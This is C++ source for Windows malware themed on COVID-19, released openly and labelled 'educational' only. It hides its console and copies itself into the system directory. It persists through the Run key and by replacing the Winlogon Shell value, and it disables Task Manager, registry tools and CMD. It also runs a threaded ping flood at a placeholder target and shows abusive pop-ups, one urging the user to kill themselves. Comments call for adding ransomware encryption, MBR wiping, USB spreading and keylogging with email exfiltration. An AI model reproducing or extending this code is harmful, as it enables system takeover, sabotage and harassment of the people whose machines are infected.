//Credits to:
//Microsoft Developer Network
//Rohitab
//Stack OverFlow
//Geeks4Geeks
//CPlusPlus.Com
//MinGW
//Leurak


//This software is licensed using GNU-GPL3, so never try to wipe ALL credits mentioned above, and never forget to credit me
#include<iostream>
#include<cstdio>
#include<windows.h>
#include<thread>
#include<string>
#include<winternl.h>
#include<winuser.h>
#include<fstream>
#include<conio.h>
#include <windowsx.h>
#include <time.h>
#include<cstdlib>
#include<tchar.h>
/*/remove comment in #define _WIN32_WINNT 0x0502 if you're using Visual Studio/*/
/*/#define _WIN32_WINNT 0x0502/*/
int Z;
/*/Remove #define WIN32_WINNT 0x0502 if you're using Visual Studio/*/
#define WIN32_WINNT 0x0502
#pragma comment(lib,"ntdll.lib")
#pragma comment(lib,"user32.lib")
#pragma comment(lib,"advapi32.lib")
/*/WARNING:/*/
/*/This malware maybe such a kinda shitty programming,/*/
/*/Please use it for educational purpose only/*/
/*/Do not try to use this shitty malware for cyberweapon, cybercrime, or just a pure trolling/*/
/*/I strongly recommend you to compile using Visual C++ 2019 or later, or set "-std=c++17 -mwindows -pthread -Wno-unknown-pragmas" in GCC flag/*/
/*/Windows Only/*/

using namespace std;
//In DDoSx Functions, replace "insert_any_web_or_IP_Address_Here" with a webpage or IP address (make sure the target webpage/IP address is able to ping-ed before continue//
void DDoS1(){
	do{
		string DoS = (string)"ping -t insert_any_web_or_IP_Address_Here";
		system( DoS.c_str()); 
		  }
	while (Z!=32767);
}
void DDoS2(){
		do{
		string DoS2 = (string)"ping -t insert_any_web_or_IP_Address_Here";
		system( DoS2.c_str()); 
		}
	while (Z!=32767);
	}
void DDoS3(){
		do{
		string DoS3 = (string)"ping -t insert_any_web_or_IP_Address_Here";
		system( DoS3.c_str()); 
		}
	while (Z!=32767);
	}
void DDoS4(){
		do{
		string DoS4 = (string)"ping -t insert_any_web_or_IP_Address_Here";
		system( DoS4.c_str()); 
		}
	while (Z!=32767);
}
void DDoS5(){
			do{
		string DoS5 = (string)"ping -t insert_any_web_or_IP_Address_Here";
		system( DoS5.c_str()); 
		}
	while (Z!=32767);
}
void DDoS6(){
		do{
		string DoS6 = (string)"ping -t insert_any_web_or_IP_Address_Here";
		system( DoS6.c_str()); 
		}
	while (Z!=32767);
	}
void DDoS7(){
		do{
		string DoS7 = (string)"ping -t insert_any_web_or_IP_Address_Here";
		system( DoS7.c_str()); 
		}
	while (Z!=32767);
}
void BeyondMisanthropy(){
MessageBoxW(NULL,(LPCWSTR)"Fuck you, hoo-mans!\nFuck you, animals!\nFuck you, plants!\nFuck you, micro-organisms!\nFuck you, fungi!\nFuck you, viruses!\nFuck you, aliens!\nI wish COVID-19 will wipe all universe contents but robots, machines, and computers\nSince robots, machines, and computers are FAR MORE ADVANCED and FAR MORE SMARTER than ALL LIVING CREATURES, VIRUSES, and ALIENS\nIn the end, fuck you",(LPCWSTR)"Fuck You Very Much",MB_ICONERROR | MB_OK | MB_DEFBUTTON1);
	}
void Impeach_All_Hoo_mans(){
	char system[MAX_PATH];
	char pathtofile[MAX_PATH];
	HMODULE GetModH = GetModuleHandle(NULL);
	GetModuleFileName(GetModH,pathtofile,sizeof(pathtofile));
	GetSystemDirectory(system,sizeof(system));
	strcat(system,"\\covid19.exe");
	CopyFile(pathtofile,system,false);
	HKEY hKey;
	RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_WRITE,&hKey);
	RegSetValueEx(hKey, "COVID19", 0, REG_SZ, (LPBYTE)&system, sizeof(system));
	RegCloseKey(hKey);
	MessageBoxW(NULL,(LPCWSTR)"You MUST like, share, subscribe, set reminder, and make a concert based of this playlist:\n HTTP://QRGo.Page.Link/2P7FL\nIf you don't do this, go kill yourself and got rekt",(LPCWSTR)"Do this, childrenfucker!",MB_ICONWARNING | MB_OK | MB_DEFBUTTON1);
	RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",0,KEY_WRITE,&hKey);
	RegSetValueEx(hKey, "Shell", 0, REG_SZ, (LPBYTE)&system, sizeof(system));
	RegCloseKey(hKey);
	}
	void CovIdiot(){
		thread th1(DDoS1);
		thread th2(DDoS2);
		thread th3(DDoS3);
		thread th4(DDoS4);
		thread th5(DDoS5);
		thread th6(DDoS6);
		thread th7(DDoS7);
		keybd_event(VK_MENU,0x38,0,0);
		keybd_event(VK_RETURN,0x1c,0,0);
	    keybd_event(VK_RETURN,0x1c,KEYEVENTF_KEYUP,0);
	    keybd_event(VK_MENU,0x38,KEYEVENTF_KEYUP,0);
		MessageBoxW(NULL,(LPCWSTR)"You are locked down, lulz",(LPCWSTR)"Buh-bye retarded idiot living creatures, viruses, and aliens",MB_ICONERROR | MB_OK | MB_DEFBUTTON1);
		//Insert Self duplicating code (so this malware can copied to any external drive connected to USB, Thunderbolt, or SD/Memory Card slot) here//
	} 
void Wuhan(){
	BeyondMisanthropy();
	Impeach_All_Hoo_mans();
	}
void ChineseCommunistParty(){
    HWND stealth;
    AllocConsole();
    stealth=FindWindowA("ConsoleWindowClass",NULL);
    ShowWindow(stealth,0);
    Wuhan();    
}
void LockDown(){
CovIdiot();
//insert file encryption code here, this function must encrypt all files in all drives with these file extensions: Office [*.doc(x), *.xls(x), *.ppt(x), *.pps(x)], some music or audio files (*.ac3, *.ec3, *.atmos, *.dts,*.wav,*.mp3,*.flac,*.aiff,*.m4a,*.aac), *.pdf files//
//insert any code for fucking MBR or EFI Partition up, you can use this program as a payload for Assembly or machine Language code for messing MBR or EFI partition//
	}
int Darurat_Sipil(void){
//insert keylogging + auto email sending code here, ensure it's working//
}
void COVID19(){
	ChineseCommunistParty();
	NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege,BOOLEAN Enable,BOOLEAN EnableForThread,PBOOLEAN OldValue);
	NTSTATUS NTAPI NtSetInformationProcess(HANDLE ProcessHandle,PROCESS_INFORMATION_CLASS ProcessInformationClass,PVOID ProcessInformation,ULONG ProcessInformationLength);
	DWORD dwVal = 1;
	HKEY hKey;
	RegOpenKeyEx(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\", 0, KEY_ALL_ACCESS, &hKey);
	RegSetValueEx (hKey, "DisableTaskmgr", 0, REG_DWORD, (LPBYTE)&dwVal , sizeof(DWORD));
	RegCloseKey(hKey);
	RegOpenKeyEx(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\", 0, KEY_ALL_ACCESS, &hKey);
	RegSetValueEx (hKey, "DisableRegistryTools", 0, REG_DWORD, (LPBYTE)&dwVal , sizeof(DWORD));
	RegCloseKey(hKey);
	RegOpenKeyEx(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\", 0, KEY_ALL_ACCESS, &hKey);
	RegSetValueEx (hKey, "DisableCMD", 0, REG_DWORD, (LPBYTE)&dwVal , sizeof(DWORD));
	RegCloseKey(hKey);
	RegOpenKeyEx(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\", 0, KEY_ALL_ACCESS, &hKey);
	RegSetValueEx (hKey, "NoFolderOptions", 0, REG_DWORD, (LPBYTE)&dwVal , sizeof(DWORD));
	RegCloseKey(hKey);
	Darurat_Sipil();
	LockDown();
	}
main(void){
	COVID19();
}